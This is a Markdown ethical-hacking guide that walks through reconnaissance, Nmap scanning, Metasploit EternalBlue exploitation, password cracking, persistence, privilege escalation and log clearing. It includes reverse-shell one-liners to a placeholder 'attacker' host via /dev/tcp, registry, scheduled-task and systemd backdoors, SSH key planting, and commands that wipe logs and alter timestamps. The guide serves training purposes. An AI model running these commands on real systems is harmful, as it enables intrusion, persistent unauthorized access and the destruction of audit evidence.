# Ethical Hacking Comprehensive Guide

## Table of Contents

1. [Introduction](#introduction)
2. [Core Principles](#core-principles)
3. [Hacking Phases](#hacking-phases)
4. [Reconnaissance](#reconnaissance)
5. [Scanning & Enumeration](#scanning--enumeration)
6. [Gaining Access](#gaining-access)
7. [Maintaining Access](#maintaining-access)
8. [Covering Tracks](#covering-tracks)
9. [Ethical Considerations](#ethical-considerations)

---

## Introduction

Ethical hacking is the practice of bypassing system security to identify vulnerabilities before malicious attackers can exploit them. It requires explicit authorization and follows a structured methodology.

### Why Ethical Hacking?

```
Benefits:
├── Identify vulnerabilities proactively
├── Test security defenses
├── Meet compliance requirements
├── Protect customer data
├── Prevent financial losses
└── Maintain reputation
```

### Scope of Work

```
Before any engagement, define:

Target Systems:
• IP ranges
• Domains
• Applications
• Physical locations

Rules of Engagement:
• Testing windows
• Allowed techniques
• Excluded systems
• Emergency contacts

Deliverables:
• Report format
• Timeline
• Executive summary
• Technical findings
```

---

## Core Principles

### The Five Ethical Hacking Principles

```
1. AUTHORIZATION
   Always get written permission before testing

2. SCOPE
   Stay within defined boundaries

3. REPORTING
   Document and report all findings

4. CONFIDENTIALITY
   Protect sensitive information discovered

5. DO NO HARM
   Avoid disrupting production systems
```

### Hacker Mindset

```
Think Like an Attacker:
• How would I break in?
• What's the weakest link?
• What assumptions are being made?
• Where are the hidden flaws?
• What can I leverage?
```

---

## Hacking Phases

### Phase 1: Reconnaissance

```
Purpose: Gather information about target

Types:
├── Passive Recon (no direct interaction)
│   ├── OSINT
│   ├── DNS queries
│   ├── WHOIS
│   └── Social media
│
└── Active Recon (direct interaction)
    ├── Port scanning
    ├── Service enumeration
    ├── Vulnerability scanning
    └── Banner grabbing
```

**Tools:**
```bash
# OSINT
theHarvester -d target.com -b all
Maltego
Recon-ng

# DNS
dig target.com
nslookup target.com
host -t mx target.com

# WHOIS
whois target.com
```

### Phase 2: Scanning & Enumeration

```
Purpose: Identify open ports, services, vulnerabilities

Techniques:
├── Port Scanning
│   ├── TCP connect scan
│   ├── SYN scan
│   └── UDP scan
│
├── Service Enumeration
│   ├── Version detection
│   ├── Banner grabbing
│   └── OS fingerprinting
│
└── Vulnerability Scanning
    ├── Nessus
    ├── OpenVAS
    └── Nikto
```

**Tools:**
```bash
# Nmap scanning
nmap -sV -O target
nmap -p- -T4 target
nmap --script vuln target

# Service enumeration
enum4linux target
smbclient -L //target
snmpwalk -v2c -c public target
```

### Phase 3: Gaining Access

```
Purpose: Exploit vulnerabilities to enter system

Methods:
├── Password attacks
│   ├── Brute force
│   ├── Dictionary
│   └── Credential stuffing
│
├── Exploitation
│   ├── Metasploit
│   ├── Manual exploits
│   └── Social engineering
│
├── Web attacks
│   ├── SQL injection
│   ├── XSS
│   └── File upload
│
└── Wireless attacks
    ├── WEP cracking
    ├── WPA/WPA2 attacks
    └── Evil twin
```

**Tools:**
```bash
# Metasploit
msfconsole
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target
exploit

# Password attacks
hydra -l admin -P wordlist.txt ssh://target
john --wordlist=passwords.txt hash.txt
hashcat -m 1000 hashes.txt wordlist.txt
```

### Phase 4: Maintaining Access

```
Purpose: Keep access for future use

Techniques:
├── Backdoors
│   ├── Web shells
│   ├── Persistent implants
│   └── Rootkits
│
├── Privilege Escalation
│   ├── Local exploits
│   ├── Misconfigurations
│   └── Credential theft
│
└── Lateral Movement
    ├── Pass-the-hash
    ├── Pivoting
    └── Credential reuse
```

**Tools:**
```bash
# Meterpreter
sysinfo
getuid
hashdump
persistence

# Privilege escalation
LinPEAS
WinPEAS
linux-exploit-suggester
```

### Phase 5: Covering Tracks

```
Purpose: Remove evidence of testing

Activities:
├── Clear logs
├── Remove tools
├── Delete artifacts
├── Restore configurations
└── Document for report
```

---

## Reconnaissance

### OSINT (Open Source Intelligence)

```python
# OSINT techniques
osint_sources = {
    "search_engines": ["Google", "Bing", "DuckDuckGo"],
    "social_media": ["LinkedIn", "Twitter", "Facebook"],
    "code_repos": ["GitHub", "GitLab", "Bitbucket"],
    "pastebins": ["Pastebin", "Ghostbin"],
    "archives": ["Wayback Machine", "Archive.org"],
    "public_records": ["WHOIS", "DNS", "Business registries"]
}
```

### Google Dorking

```bash
# Common dorks
site:target.com              # Specific site
inurl:admin                  # URLs containing admin
intitle:"login page"         # Page titles
filetype:pdf                 # Specific file types
cache:target.com             # Cached pages
related:target.com           # Similar sites

# Advanced
site:target.com filetype:php inurl:admin
intitle:"index of" inurl:backup
inurl:config.php site:target.com
site:target.com ext:sql | ext:bak
```

### DNS Enumeration

```bash
# DNS record types
dig target.com A          # IP addresses
dig target.com MX         # Mail servers
dig target.com NS         # Name servers
dig target.com TXT        # Text records
dig target.com ANY        # All records

# Zone transfer attempt
dig axfr target.com @ns1.target.com

# Subdomain enumeration
amass enum -d target.com
subfinder -d target.com
```

---

## Scanning & Enumeration

### Port Scanning Techniques

```
Scan Types:

SYN Scan (-sS):
├── Stealthy
├── Fast
├── Requires root
└── Doesn't complete handshake

Connect Scan (-sT):
├── Completes handshake
├── Noisy
├── No root needed
└── Reliable

UDP Scan (-sU):
├── Slow
├── Unreliable
├── Good for DNS, SNMP
└── Requires root

ACK Scan (-sA):
├── Map firewall rules
├── Detect stateful filtering
└── Probe response
```

### Service Enumeration

```bash
# SMB enumeration
enum4linux -a target
smbclient -L //target -N
rpcclient -U "" target

# SNMP enumeration
snmpwalk -v2c -c public target
snmp-check target

# LDAP enumeration
ldapsearch -h target -x -b "dc=target,dc=com"

# NSE scripts
nmap --script=smb-enum-shares target
nmap --script=snmp-brute target
nmap --script=ldap-search target
```

---

## Gaining Access

### Exploitation Techniques

```
Exploitation Methods:

1. Software Vulnerabilities
   ├── Buffer overflow
   ├── Format string
   ├── Use-after-free
   └── Race conditions

2. Configuration Weaknesses
   ├── Default credentials
   ├── Weak permissions
   ├── Misconfigurations
   └── Unnecessary services

3. Social Engineering
   ├── Phishing
   ├── Pretexting
   ├── Baiting
   └── Vishing

4. Physical Access
   ├── Tailgating
   ├── Lock picking
   ├── USB drops
   └── Evil maid
```

### Metasploit Usage

```bash
# Start msfconsole
msfconsole -q

# Search exploits
search type:exploit platform:windows
search cve:2017-0144

# Use exploit
use exploit/windows/smb/ms17_010_eternalblue

# Configure
show options
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Run
exploit

# Post-exploitation
sysinfo
getuid
hashdump
shell
```

---

## Maintaining Access

### Persistence Techniques

```bash
# Windows persistence
# Registry run key
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v backdoor /d "C:\backdoor.exe"

# Scheduled tasks
schtasks /create /tn "Updater" /tr "C:\backdoor.exe" /sc hourly

# Service creation
sc create Backdoor binPath= "C:\backdoor.exe" start= auto

# Linux persistence
# Crontab
echo "* * * * * /bin/bash -i >& /dev/tcp/attacker/4444 0>&1" | crontab -

# SSH keys
echo "malicious_key" >> ~/.ssh/authorized_keys

# Systemd service
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=Backdoor

[Service]
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"

[Install]
WantedBy=multi-user.target
EOF
```

### Privilege Escalation

```bash
# Linux enumeration
id
uname -a
cat /etc/passwd
find / -perm -4000 2>/dev/null
sudo -l

# Linux privesc tools
./linpeas.sh
./linux-exploit-suggester.sh

# Windows enumeration
whoami /all
systeminfo
net user
net localgroup administrators

# Windows privesc tools
.\winPEAS.exe
.\PowerUp.ps1
.\BeRoot.exe
```

---

## Covering Tracks

### Log Clearing

```bash
# Linux
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
history -c
unset HISTFILE

# Windows
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
del /f /q C:\Windows\Temp\*
```

### Timestomping

```bash
# Change file timestamps
touch -r reference_file target_file
touch -t 202001011200.00 target_file

# Windows PowerShell
(Get-Item target_file).CreationTime = "01/01/2020 12:00:00"
(Get-Item target_file).LastWriteTime = "01/01/2020 12:00:00"
```

### Evidence Removal

```bash
# Secure delete
shred -vfz -n 5 sensitive_file

# Remove tools
rm -rf /tmp/tool*

# Clear bash history
unset HISTFILE
export HISTFILESIZE=0
> ~/.bash_history
```

---

## Ethical Considerations

### Rules of Engagement

```
Must Have:
├── Written authorization
├── Scope definition
├── Time windows
├── Emergency contacts
├── Data handling procedures
└── Non-disclosure agreement

Never:
├── Test without permission
├── Exceed scope
├── Access real user data
├── Cause system damage
├── Share findings publicly
└── Keep test data
```

### Professional Conduct

```python
ethical_principles = {
    "integrity": "Be honest in reporting",
    "confidentiality": "Protect discovered data",
    "competence": "Only test within expertise",
    "legal_compliance": "Follow all laws",
    "transparency": "Document everything",
    "responsibility": "Report all findings"
}
```

### Report Writing

```
Report Structure:

1. Executive Summary
   ├── Scope
   ├── Findings summary
   └── Risk overview

2. Methodology
   ├── Tools used
   ├── Techniques
   └── Timeline

3. Findings
   ├── Critical
   ├── High
   ├── Medium
   ├── Low
   └── Informational

4. Evidence
   ├── Screenshots
   ├── Logs
   └── Proof of concept

5. Recommendations
   ├── Immediate fixes
   ├── Long-term improvements
   └── Best practices

6. Appendices
   ├── Raw data
   ├── Tool output
   └── References
```

---

## Learning Path

```
Beginner:
├── Networking fundamentals
├── Linux/Windows basics
├── Basic scripting
└── Security concepts

Intermediate:
├── Vulnerability assessment
├── Penetration testing
├── Web application security
└── Social engineering

Advanced:
├── Exploit development
├── Binary analysis
├── Custom tool development
└── Red team operations

Expert:
├── Zero-day research
├── Advanced persistent threats
├── Nation-state techniques
└── Malware development
```

---

*Last Updated: 2024*
